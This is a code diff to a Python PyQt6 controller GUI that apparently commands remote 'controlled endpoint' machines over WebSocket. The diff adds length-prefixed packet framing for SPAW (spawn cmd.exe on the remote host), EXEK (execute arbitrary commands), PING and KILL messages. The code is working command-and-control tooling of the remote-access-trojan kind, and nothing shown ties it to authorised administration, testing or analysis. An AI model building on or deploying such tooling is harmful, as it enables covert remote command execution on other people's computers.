@@ -6,12 +6,12 @@ import ssl
 import hashlib
 import base64
 import time
+import struct
 from datetime import datetime
 from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                              QLabel, QLineEdit, QPushButton, QListView, QTextEdit, QDialog,
                              QMenu, QAbstractItemView, QRadioButton, QButtonGroup)
 from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal, QObject, pyqtSlot, QTimer
-import struct
 
 WS_OP_CONTINUE = 0x00
 WS_OP_TEXT = 0x01
@@ -200,6 +200,11 @@ def ws_handle_http_upgrade(sock: socket.socket) -> tuple[bool, str]:
     return True, real_ip
 
 
+def build_agent_packet(payload: bytes) -> bytes:
+    """构造agent原始协议包：4字节大端长度头 + payload"""
+    return struct.pack(">I", len(payload)) + payload
+
+
 class ClientSignals(QObject):
     on_outp = pyqtSignal(object, str)
     on_disconnect = pyqtSignal(object)
@@ -219,10 +224,7 @@ class ClientSession:
         self._frag_opcode = 0
 
     def send_packet(self, body: bytes) -> bool:
-        """
-        上层调用和原来完全一样！
-        body就是原来业务包(PING/SPAW/KILL/EXEK...)，内部包装成WebSocket BINARY帧
-        """
+        """body为完整agent业务包(带4字节长度头),封装WS BINARY帧发出"""
         if not self.connected:
             return False
         try:
@@ -277,7 +279,8 @@ class RemoteCmdDialog(QDialog):
         lay.addLayout(input_lay)
 
         self.out_box.append(f"==== 连接 {self.client.ip_str} 远程CMD ====\n[*] 已发送SPAW启动被控端cmd.exe")
-        self.client.send_packet(b"SPAW")
+        pkt_spaw = build_agent_packet(b"SPAW")
+        self.client.send_packet(pkt_spaw)
 
     @pyqtSlot(str)
     def append_text(self, text: str):
@@ -290,7 +293,8 @@ class RemoteCmdDialog(QDialog):
             self.out_box.append("\n[!] 连接断开")
             return
         payload = b"EXEK" + cmd.encode("gbk", errors="replace")
-        ok = self.client.send_packet(payload)
+        full_pkt = build_agent_packet(payload)
+        ok = self.client.send_packet(full_pkt)
         self.out_box.append(f"> {cmd}")
         if not ok:
             self.out_box.append("[发送失败]")
@@ -298,7 +302,8 @@ class RemoteCmdDialog(QDialog):
     def closeEvent(self, event):
         self.is_alive = False
         if self.client.connected:
-            self.client.send_packet(b"KILL")
+            pkt_kill = build_agent_packet(b"KILL")
+            self.client.send_packet(pkt_kill)
         if self.main_window and self.client in self.main_window.open_cmd_dialogs:
             del self.main_window.open_cmd_dialogs[self.client]
         super().closeEvent(event)
@@ -408,7 +413,8 @@ class MainWindow(QMainWindow):
     def broadcast_ping(self):
         for sess in list(self.client_model.items):
             if sess.connected:
-                sess.send_packet(b"PING")
+                pkt = build_agent_packet(b"PING")
+                sess.send_packet(pkt)
 
     def accept_loop(self):
         use_wss = self.radio_wss.isChecked()
